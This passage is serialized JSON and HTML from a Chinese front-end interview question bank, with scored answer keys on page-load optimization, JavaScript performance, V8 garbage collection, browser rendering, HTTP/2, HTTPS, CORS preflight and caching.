避免在动画中使用高开销的CSS属性","task":false,"loose":false,"text":"避免在动画中使用高开销的CSS属性","tokens":[{"type":"text","raw":"避免在动画中使用高开销的CSS属性","text":"避免在动画中使用高开销的CSS属性","tokens":[{"type":"text","raw":"避免在动画中使用高开销的CSS属性","text":"避免在动画中使用高开销的CSS属性","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何优化首屏加载时间？\\n\\n","depth":2,"text":"如何优化首屏加载时间？","tokens":[{"type":"text","raw":"如何优化首屏加载时间？","text":"如何优化首屏加载时间？","escaped":false}]},{"type":"heading","raw":"#### 类型：`高级`\\n\\n","depth":4,"text":"类型：`高级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`高级`","text":"高级"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 资源压缩与合并：\\n  + 使用工具压缩JavaScript、CSS和HTML\\n  + 合并多个CSS和JavaScript文件\\n\\n- **1：** 使用CDN：\\n  + 将静态资源托管到CDN上\\n  + 减少资源加载的延迟\\n\\n- **1：** 图片优化：\\n  + 使用合适的图片格式（如WebP）\\n  + 使用图片懒加载\\n  + 使用CSS Sprites合并小图标\\n\\n- **1：** 服务器端渲染（SSR）：\\n  + 使用SSR生成首屏HTML\\n  + 减少客户端渲染的时间\\n\\n- **1：** 减少HTTP请求：\\n  + 使用HTTP/2多路复用\\n  + 合并请求，减少请求数量","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 资源压缩与合并：\\n  + 使用工具压缩JavaScript、CSS和HTML\\n  + 合并多个CSS和JavaScript文件\\n\\n","task":false,"loose":true,"text":"**1：** 资源压缩与合并：\\n+ 使用工具压缩JavaScript、CSS和HTML\\n+ 合并多个CSS和JavaScript文件\\n","tokens":[{"type":"text","raw":"**1：** 资源压缩与合并：\\n","text":"**1：** 资源压缩与合并：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 资源压缩与合并：","text":" 资源压缩与合并：","escaped":false}]},{"type":"list","raw":"+ 使用工具压缩JavaScript、CSS和HTML\\n+ 合并多个CSS和JavaScript文件\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用工具压缩JavaScript、CSS和HTML\\n","task":false,"loose":false,"text":"使用工具压缩JavaScript、CSS和HTML","tokens":[{"type":"text","raw":"使用工具压缩JavaScript、CSS和HTML","text":"使用工具压缩JavaScript、CSS和HTML","tokens":[{"type":"text","raw":"使用工具压缩JavaScript、CSS和HTML","text":"使用工具压缩JavaScript、CSS和HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 合并多个CSS和JavaScript文件","task":false,"loose":false,"text":"合并多个CSS和JavaScript文件","tokens":[{"type":"text","raw":"合并多个CSS和JavaScript文件","text":"合并多个CSS和JavaScript文件","tokens":[{"type":"text","raw":"合并多个CSS和JavaScript文件","text":"合并多个CSS和JavaScript文件","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用CDN：\\n  + 将静态资源托管到CDN上\\n  + 减少资源加载的延迟\\n\\n","task":false,"loose":true,"text":"**1：** 使用CDN：\\n+ 将静态资源托管到CDN上\\n+ 减少资源加载的延迟\\n","tokens":[{"type":"text","raw":"**1：** 使用CDN：\\n","text":"**1：** 使用CDN：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用CDN：","text":" 使用CDN：","escaped":false}]},{"type":"list","raw":"+ 将静态资源托管到CDN上\\n+ 减少资源加载的延迟\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 将静态资源托管到CDN上\\n","task":false,"loose":false,"text":"将静态资源托管到CDN上","tokens":[{"type":"text","raw":"将静态资源托管到CDN上","text":"将静态资源托管到CDN上","tokens":[{"type":"text","raw":"将静态资源托管到CDN上","text":"将静态资源托管到CDN上","escaped":false}]}]},{"type":"list_item","raw":"+ 减少资源加载的延迟","task":false,"loose":false,"text":"减少资源加载的延迟","tokens":[{"type":"text","raw":"减少资源加载的延迟","text":"减少资源加载的延迟","tokens":[{"type":"text","raw":"减少资源加载的延迟","text":"减少资源加载的延迟","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 图片优化：\\n  + 使用合适的图片格式（如WebP）\\n  + 使用图片懒加载\\n  + 使用CSS Sprites合并小图标\\n\\n","task":false,"loose":true,"text":"**1：** 图片优化：\\n+ 使用合适的图片格式（如WebP）\\n+ 使用图片懒加载\\n+ 使用CSS Sprites合并小图标\\n","tokens":[{"type":"text","raw":"**1：** 图片优化：\\n","text":"**1：** 图片优化：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 图片优化：","text":" 图片优化：","escaped":false}]},{"type":"list","raw":"+ 使用合适的图片格式（如WebP）\\n+ 使用图片懒加载\\n+ 使用CSS Sprites合并小图标\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用合适的图片格式（如WebP）\\n","task":false,"loose":false,"text":"使用合适的图片格式（如WebP）","tokens":[{"type":"text","raw":"使用合适的图片格式（如WebP）","text":"使用合适的图片格式（如WebP）","tokens":[{"type":"text","raw":"使用合适的图片格式（如WebP）","text":"使用合适的图片格式（如WebP）","escaped":false}]}]},{"type":"list_item","raw":"+ 使用图片懒加载\\n","task":false,"loose":false,"text":"使用图片懒加载","tokens":[{"type":"text","raw":"使用图片懒加载","text":"使用图片懒加载","tokens":[{"type":"text","raw":"使用图片懒加载","text":"使用图片懒加载","escaped":false}]}]},{"type":"list_item","raw":"+ 使用CSS Sprites合并小图标","task":false,"loose":false,"text":"使用CSS Sprites合并小图标","tokens":[{"type":"text","raw":"使用CSS Sprites合并小图标","text":"使用CSS Sprites合并小图标","tokens":[{"type":"text","raw":"使用CSS Sprites合并小图标","text":"使用CSS Sprites合并小图标","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 服务器端渲染（SSR）：\\n  + 使用SSR生成首屏HTML\\n  + 减少客户端渲染的时间\\n\\n","task":false,"loose":true,"text":"**1：** 服务器端渲染（SSR）：\\n+ 使用SSR生成首屏HTML\\n+ 减少客户端渲染的时间\\n","tokens":[{"type":"text","raw":"**1：** 服务器端渲染（SSR）：\\n","text":"**1：** 服务器端渲染（SSR）：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端渲染（SSR）：","text":" 服务器端渲染（SSR）：","escaped":false}]},{"type":"list","raw":"+ 使用SSR生成首屏HTML\\n+ 减少客户端渲染的时间\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用SSR生成首屏HTML\\n","task":false,"loose":false,"text":"使用SSR生成首屏HTML","tokens":[{"type":"text","raw":"使用SSR生成首屏HTML","text":"使用SSR生成首屏HTML","tokens":[{"type":"text","raw":"使用SSR生成首屏HTML","text":"使用SSR生成首屏HTML","escaped":false}]}]},{"type":"list_item","raw":"+ 减少客户端渲染的时间","task":false,"loose":false,"text":"减少客户端渲染的时间","tokens":[{"type":"text","raw":"减少客户端渲染的时间","text":"减少客户端渲染的时间","tokens":[{"type":"text","raw":"减少客户端渲染的时间","text":"减少客户端渲染的时间","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 减少HTTP请求：\\n  + 使用HTTP/2多路复用\\n  + 合并请求，减少请求数量","task":false,"loose":true,"text":"**1：** 减少HTTP请求：\\n+ 使用HTTP/2多路复用\\n+ 合并请求，减少请求数量","tokens":[{"type":"text","raw":"**1：** 减少HTTP请求：\\n","text":"**1：** 减少HTTP请求：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少HTTP请求：","text":" 减少HTTP请求：","escaped":false}]},{"type":"list","raw":"+ 使用HTTP/2多路复用\\n+ 合并请求，减少请求数量","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用HTTP/2多路复用\\n","task":false,"loose":false,"text":"使用HTTP/2多路复用","tokens":[{"type":"text","raw":"使用HTTP/2多路复用","text":"使用HTTP/2多路复用","tokens":[{"type":"text","raw":"使用HTTP/2多路复用","text":"使用HTTP/2多路复用","escaped":false}]}]},{"type":"list_item","raw":"+ 合并请求，减少请求数量","task":false,"loose":false,"text":"合并请求，减少请求数量","tokens":[{"type":"text","raw":"合并请求，减少请求数量","text":"合并请求，减少请求数量","tokens":[{"type":"text","raw":"合并请求，减少请求数量","text":"合并请求，减少请求数量","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何进行JavaScript性能优化？\\n\\n","depth":2,"text":"如何进行JavaScript性能优化？","tokens":[{"type":"text","raw":"如何进行JavaScript性能优化？","text":"如何进行JavaScript性能优化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`高级`\\n\\n","depth":4,"text":"类型：`高级`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`高级`","text":"高级"}]},{"type":"heading","raw":"#### 级别：`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"list","raw":"- **1：** 减少作用域链查找：\\n  + 使用局部变量缓存全局变量\\n  + 避免在循环中访问全局变量\\n\\n- **1：** 避免不必要的计算：\\n  + 使用缓存存储计算结果\\n  + 使用位运算替代数学运算\\n\\n- **1：** 优化循环：\\n  + 使用for循环代替forEach、map等\\n  + 在循环中缓存数组长度\\n\\n- **1：** 使用异步编程：\\n  + 使用Promise、async/await优化异步操作\\n  + 使用Web Workers进行多线程计算\\n\\n- **1：** 减少内存泄漏：\\n  + 使用WeakMap、WeakSet管理对象引用\\n  + 清理不再使用的事件监听器\\n\\n- **1：** 使用现代JavaScript特性：\\n  + 使用ES6+特性优化代码结构\\n  + 使用模块化提高代码可维护性\\n","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** 减少作用域链查找：\\n  + 使用局部变量缓存全局变量\\n  + 避免在循环中访问全局变量\\n\\n","task":false,"loose":true,"text":"**1：** 减少作用域链查找：\\n+ 使用局部变量缓存全局变量\\n+ 避免在循环中访问全局变量\\n","tokens":[{"type":"text","raw":"**1：** 减少作用域链查找：\\n","text":"**1：** 减少作用域链查找：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少作用域链查找：","text":" 减少作用域链查找：","escaped":false}]},{"type":"list","raw":"+ 使用局部变量缓存全局变量\\n+ 避免在循环中访问全局变量\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用局部变量缓存全局变量\\n","task":false,"loose":false,"text":"使用局部变量缓存全局变量","tokens":[{"type":"text","raw":"使用局部变量缓存全局变量","text":"使用局部变量缓存全局变量","tokens":[{"type":"text","raw":"使用局部变量缓存全局变量","text":"使用局部变量缓存全局变量","escaped":false}]}]},{"type":"list_item","raw":"+ 避免在循环中访问全局变量","task":false,"loose":false,"text":"避免在循环中访问全局变量","tokens":[{"type":"text","raw":"避免在循环中访问全局变量","text":"避免在循环中访问全局变量","tokens":[{"type":"text","raw":"避免在循环中访问全局变量","text":"避免在循环中访问全局变量","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 避免不必要的计算：\\n  + 使用缓存存储计算结果\\n  + 使用位运算替代数学运算\\n\\n","task":false,"loose":true,"text":"**1：** 避免不必要的计算：\\n+ 使用缓存存储计算结果\\n+ 使用位运算替代数学运算\\n","tokens":[{"type":"text","raw":"**1：** 避免不必要的计算：\\n","text":"**1：** 避免不必要的计算：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 避免不必要的计算：","text":" 避免不必要的计算：","escaped":false}]},{"type":"list","raw":"+ 使用缓存存储计算结果\\n+ 使用位运算替代数学运算\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用缓存存储计算结果\\n","task":false,"loose":false,"text":"使用缓存存储计算结果","tokens":[{"type":"text","raw":"使用缓存存储计算结果","text":"使用缓存存储计算结果","tokens":[{"type":"text","raw":"使用缓存存储计算结果","text":"使用缓存存储计算结果","escaped":false}]}]},{"type":"list_item","raw":"+ 使用位运算替代数学运算","task":false,"loose":false,"text":"使用位运算替代数学运算","tokens":[{"type":"text","raw":"使用位运算替代数学运算","text":"使用位运算替代数学运算","tokens":[{"type":"text","raw":"使用位运算替代数学运算","text":"使用位运算替代数学运算","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 优化循环：\\n  + 使用for循环代替forEach、map等\\n  + 在循环中缓存数组长度\\n\\n","task":false,"loose":true,"text":"**1：** 优化循环：\\n+ 使用for循环代替forEach、map等\\n+ 在循环中缓存数组长度\\n","tokens":[{"type":"text","raw":"**1：** 优化循环：\\n","text":"**1：** 优化循环：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 优化循环：","text":" 优化循环：","escaped":false}]},{"type":"list","raw":"+ 使用for循环代替forEach、map等\\n+ 在循环中缓存数组长度\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用for循环代替forEach、map等\\n","task":false,"loose":false,"text":"使用for循环代替forEach、map等","tokens":[{"type":"text","raw":"使用for循环代替forEach、map等","text":"使用for循环代替forEach、map等","tokens":[{"type":"text","raw":"使用for循环代替forEach、map等","text":"使用for循环代替forEach、map等","escaped":false}]}]},{"type":"list_item","raw":"+ 在循环中缓存数组长度","task":false,"loose":false,"text":"在循环中缓存数组长度","tokens":[{"type":"text","raw":"在循环中缓存数组长度","text":"在循环中缓存数组长度","tokens":[{"type":"text","raw":"在循环中缓存数组长度","text":"在循环中缓存数组长度","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用异步编程：\\n  + 使用Promise、async/await优化异步操作\\n  + 使用Web Workers进行多线程计算\\n\\n","task":false,"loose":true,"text":"**1：** 使用异步编程：\\n+ 使用Promise、async/await优化异步操作\\n+ 使用Web Workers进行多线程计算\\n","tokens":[{"type":"text","raw":"**1：** 使用异步编程：\\n","text":"**1：** 使用异步编程：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用异步编程：","text":" 使用异步编程：","escaped":false}]},{"type":"list","raw":"+ 使用Promise、async/await优化异步操作\\n+ 使用Web Workers进行多线程计算\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用Promise、async/await优化异步操作\\n","task":false,"loose":false,"text":"使用Promise、async/await优化异步操作","tokens":[{"type":"text","raw":"使用Promise、async/await优化异步操作","text":"使用Promise、async/await优化异步操作","tokens":[{"type":"text","raw":"使用Promise、async/await优化异步操作","text":"使用Promise、async/await优化异步操作","escaped":false}]}]},{"type":"list_item","raw":"+ 使用Web Workers进行多线程计算","task":false,"loose":false,"text":"使用Web Workers进行多线程计算","tokens":[{"type":"text","raw":"使用Web Workers进行多线程计算","text":"使用Web Workers进行多线程计算","tokens":[{"type":"text","raw":"使用Web Workers进行多线程计算","text":"使用Web Workers进行多线程计算","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 减少内存泄漏：\\n  + 使用WeakMap、WeakSet管理对象引用\\n  + 清理不再使用的事件监听器\\n\\n","task":false,"loose":true,"text":"**1：** 减少内存泄漏：\\n+ 使用WeakMap、WeakSet管理对象引用\\n+ 清理不再使用的事件监听器\\n","tokens":[{"type":"text","raw":"**1：** 减少内存泄漏：\\n","text":"**1：** 减少内存泄漏：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 减少内存泄漏：","text":" 减少内存泄漏：","escaped":false}]},{"type":"list","raw":"+ 使用WeakMap、WeakSet管理对象引用\\n+ 清理不再使用的事件监听器\\n","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用WeakMap、WeakSet管理对象引用\\n","task":false,"loose":false,"text":"使用WeakMap、WeakSet管理对象引用","tokens":[{"type":"text","raw":"使用WeakMap、WeakSet管理对象引用","text":"使用WeakMap、WeakSet管理对象引用","tokens":[{"type":"text","raw":"使用WeakMap、WeakSet管理对象引用","text":"使用WeakMap、WeakSet管理对象引用","escaped":false}]}]},{"type":"list_item","raw":"+ 清理不再使用的事件监听器","task":false,"loose":false,"text":"清理不再使用的事件监听器","tokens":[{"type":"text","raw":"清理不再使用的事件监听器","text":"清理不再使用的事件监听器","tokens":[{"type":"text","raw":"清理不再使用的事件监听器","text":"清理不再使用的事件监听器","escaped":false}]}]}]}]},{"type":"list_item","raw":"- **1：** 使用现代JavaScript特性：\\n  + 使用ES6+特性优化代码结构\\n  + 使用模块化提高代码可维护性","task":false,"loose":true,"text":"**1：** 使用现代JavaScript特性：\\n+ 使用ES6+特性优化代码结构\\n+ 使用模块化提高代码可维护性","tokens":[{"type":"text","raw":"**1：** 使用现代JavaScript特性：\\n","text":"**1：** 使用现代JavaScript特性：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用现代JavaScript特性：","text":" 使用现代JavaScript特性：","escaped":false}]},{"type":"list","raw":"+ 使用ES6+特性优化代码结构\\n+ 使用模块化提高代码可维护性","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 使用ES6+特性优化代码结构\\n","task":false,"loose":false,"text":"使用ES6+特性优化代码结构","tokens":[{"type":"text","raw":"使用ES6+特性优化代码结构","text":"使用ES6+特性优化代码结构","tokens":[{"type":"text","raw":"使用ES6+特性优化代码结构","text":"使用ES6+特性优化代码结构","escaped":false}]}]},{"type":"list_item","raw":"+ 使用模块化提高代码可维护性","task":false,"loose":false,"text":"使用模块化提高代码可维护性","tokens":[{"type":"text","raw":"使用模块化提高代码可维护性","text":"使用模块化提高代码可维护性","tokens":[{"type":"text","raw":"使用模块化提高代码可维护性","text":"使用模块化提高代码可维护性","escaped":false}]}]}]}]}]}]},{"key":"浏览器原理篇","content":"<h1>浏览器原理篇</h1>\\n<h2>浏览器垃圾回收机制 - V8的垃圾回收机制是怎样的</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> V8 实现了准确式 GC，GC 算法采用了分代式垃圾回收机制。因此，V8 将内存（堆）分为新生代和老生代两部分。</li>\\n<li><strong>1：</strong>（1）新生代算法 新生代中的对象一般存活时间较短，使用 Scavenge GC 算法。</li>\\n<li><strong>1：</strong>（2）老生代算法 老生代中的对象一般存活时间较长且数量也多，使用了两个算法，分别是标记清除算法和标记压缩算法。</li>\\n</ul>\\n<h2>哪些操作会造成内存泄漏？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 第一种情况是由于使用未声明的变量，而意外的创建了一个全局变量，而使这个变量一直留在内存中无法被回收。</li>\\n<li><strong>1：</strong> 第二种情况是设置了 setInterval 定时器，而忘记取消它，如果循环函数有对外部变量的引用的话，那么这个变量会被一直留在内存中，而无法被回收。</li>\\n<li><strong>1：</strong> 第三种情况是获取一个 DOM 元素的引用，而后面这个元素被删除，由于我们一直保留了对这个元素的引用，所以它也无法被回收。</li>\\n<li><strong>1：</strong> 第四种情况是不合理的使用闭包，从而导致某些变量一直被留在内存当中。</li>\\n</ul>\\n<h2>浏览器的渲染过程</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 首先解析收到的文档，根据文档定义构建一棵 DOM 树，DOM 树是由 DOM 元素及属性节点组成的。</li>\\n<li><strong>1：</strong> 然后对 CSS 进行解析，生成 CSSOM 规则树。</li>\\n<li><strong>1：</strong> 根据 DOM 树和 CSSOM 规则树构建渲染树。渲染树的节点被称为渲染对象，渲染对象是一个包含有颜色和大小等属性的矩形，渲染对象和 DOM 元素相对应，但这种对应关系不是一对一的，不可见的 DOM 元素不会被插入渲染树。还有一些 DOM元素对应几个可见对象，它们一般是一些具有复杂结构的元素，无法用一个矩形来描述。</li>\\n<li><strong>1：</strong> 当渲染对象被创建并添加到树中，它们并没有位置和大小，所以当浏览器生成渲染树以后，就会根据渲染树来进行布局（也可以叫做回流）。这一阶段浏览器要做的事情是要弄清楚各个节点在页面中的确切位置和大小。通常这一行为也被称为“自动重排”。</li>\\n<li><strong>1：</strong> 布局阶段结束后是绘制阶段，遍历渲染树并调用渲染对象的 paint 方法将它们的内容显示在屏幕上，绘制使用 UI 基础组件。</li>\\n</ul>\\n<h2>GET和POST有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>GET请求的请求参数会附加在URL之后，参数之间使用&quot;&amp;&quot;连接，多个参数将会造成URL长度增加。而POST请求的请求参数则包含在请求体中，不会在URL中显示。</li>\\n<li>由于GET请求的参数附加在URL之后，因此其请求长度受限于浏览器对URL长度的限制（通常浏览器对URL的长度有限制，而服务器对URL的长度限制更为宽松）。而POST请求则没有这个问题，请求参数包含在请求体中，因此可以传输大量数据。</li>\\n<li>GET请求的参数会暴露在URL中，因此不能用于传输敏感信息，如密码等。而POST请求的参数在请求体中，不会在URL中显示，相对更加安全。然而，这并不意味着POST请求就一定比GET请求更安全，因为安全性还需要依赖于其他因素，如SSL/TLS加密等。</li>\\n<li>GET请求是幂等的，即多次执行同一GET请求，服务器将返回相同的结果。而POST请求则不是幂等的，因为每次提交都会创建新的资源。</li>\\n<li>GET请求可以被缓存，而POST请求则不会，除非在响应头中包含适当的Cache-Control或Expires字段。</li>\\n<li>GET请求可以被浏览器缓存，因此可以通过点击后退按钮或刷新按钮来重复执行。而POST请求则不会，因为这些操作对POST请求没有实际意义。</li>\\n</ul>\\n<h2>HTTP2相对于HTTP1.x有什么优势和特点？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>HTTP/2不再使用文本格式来传输数据，而是将所有传输的信息分割为更小的消息和帧（frame），并以二进制格式进行编码。这有助于更高效地解析HTTP消息，并减少了解析错误的可能性。</li>\\n<li>HTTP/2引入了多路复用技术，允许在单个TCP连接中并行处理多个请求和响应。这消除了HTTP/1.x中的队头阻塞问题，极大地提高了网络性能和资源利用率。</li>\\n<li>HTTP/2使用了头部压缩技术，通过共享头部信息，可以显著减少传输的数据量。这有助于减少延迟和网络带宽的消耗，特别是在传输大量小请求时效果更为显著。</li>\\n<li>HTTP/2允许服务器主动向客户端推送资源，而无需等待客户端的请求。这有助于减少往返时间，并提高网页加载速度。</li>\\n<li>HTTP/2通过流控制、消息控制和窗口控制等机制，实现了对流量的精细控制，有助于防止网络拥塞和资源浪费。</li>\\n</ul>\\n<h2>https是怎么保证安全的，为什么比http安全？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>HTTPS使用SSL/TLS协议对HTTP报文进行加密，使得敏感数据在网络传输过程中不容易被窃听和篡改。这种加密过程结合了对称加密和非对称加密，确保数据的保密性和完整性。</li>\\n<li>HTTPS通过数字证书进行身份验证，确保通信双方的真实性。在建立HTTPS连接时，服务器会提供数字证书来证明自己的身份。如果验证通过，客户端就可以信任服务器，并继续与其进行安全的数据传输。这有效防止了被恶意伪装的服务器攻击。</li>\\n<li>在传输数据之前，HTTPS会对数据进行加密，并使用消息摘要（hash）算法生成一个摘要值。在数据到达接收端后，接收端会使用相同的算法对接收到的数据进行摘要计算，并与发送端的摘要值进行比较。如果两者一致，说明数据在传输过程中没有被篡改。如果不一致，通信双方应重新进行验证或中断连接。</li>\\n</ul>\\n<h2>post请求为什么会多发送一次option请求？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>POST 请求前发送的 OPTIONS 请求实际上是 HTTP 的一种特性，称为“预检请求”（Preflight request）。这主要发生在跨域请求（CORS, Cross-Origin Resource Sharing）的场景中，尤其是当请求涉及一些可能不太安全的方法（如 PUT、DELETE 或 POST）或使用了一些自定义的 HTTP 头部时。<br>预检请求的目的是检查服务器是否允许来自不同源（域、协议或端口）的请求进行某些操作。这样做可以确保客户端在发送实际请求之前，先得到服务器的明确许可。</li>\\n</ul>\\n<h2>从输入URL到看到页面发生的全过程？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li>1.用户首先在浏览器地址栏中输入想要访问的网站的URL。</li>\\n<li>2.浏览器内部代码会解析这个URL。它首先会检查本地hosts文件，看是否有对应的域名。如果有，浏览器就会直接向该IP地址发送请求。如果没有，浏览器会将域名发送给DNS服务器进行解析，将域名转换成对应的服务器IP地址。</li>\\n<li>3.浏览器通过HTTP协议向服务器发送请求。HTTP协议是一种应用层协议，用于在客户端和服务器之间传输数据。浏览器会根据URL中的路径和参数构建HTTP请求，并发送给服务器。</li>\\n<li>4.服务器接收到请求后，会根据请求的内容进行处理，并返回相应的HTTP响应。响应中包含了服务器返回的数据，如HTML、CSS、JavaScript等资源文件，以及状态码等信息。</li>\\n<li>5.浏览器接收到服务器返回的响应后，会解析响应中的数据，并开始渲染页面。浏览器会根据HTML文件中的标签和属性，将页面元素渲染出来。同时，浏览器还会下载并解析CSS和JavaScript文件，以实现页面的样式和交互功能。</li>\\n<li>6.当页面加载完成后，浏览器会触发DOMContentLoaded事件，通知页面已经加载完成。此时，页面中的JavaScript代码可以开始执行，实现页面的交互功能。</li>\\n<li>7.如果页面中还有异步请求（如Ajax请求），浏览器会继续发送这些请求，并等待服务器返回响应。当这些请求完成后，浏览器会更新页面中的相应部分，以反映最新的数据。</li>\\n</ul>\\n<h2>对Service Worker的理解</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Service Worker 是运行在浏览器背后的独立线程，一般可以用来实现缓存功能。</li>\\n<li><strong>4：</strong><ul>\\n<li>首先需要先注册 Service Worker，然后监听到 install 事件以后就可以缓存需要的文件</li>\\n<li>那么在下次用户访问的时候就可以通过拦截请求的方式查询是否存在缓存</li>\\n<li>存在缓存的话就可以直接读取缓存文件，否则就去请求数据。</li>\\n<li>打开页面，可以在开发者工具中的 Application 看到 Service Worker 已经启动了,在Cache中也可以发现所需的文件已被缓存</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>协商缓存和强缓存的区别</h2>\\n<h4>类型：<code>业务</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 强缓存<ul>\\n<li>使用强缓存策略时，如果缓存资源有效，则直接使用缓存资源，不必再向服务器发起请求。</li>\\n<li>设置方式：分别是 http 响应头信息中的 Expires 属性和 Cache-Control 属性。</li>\\n</ul>\\n</li>\\n<li><strong>2：</strong> 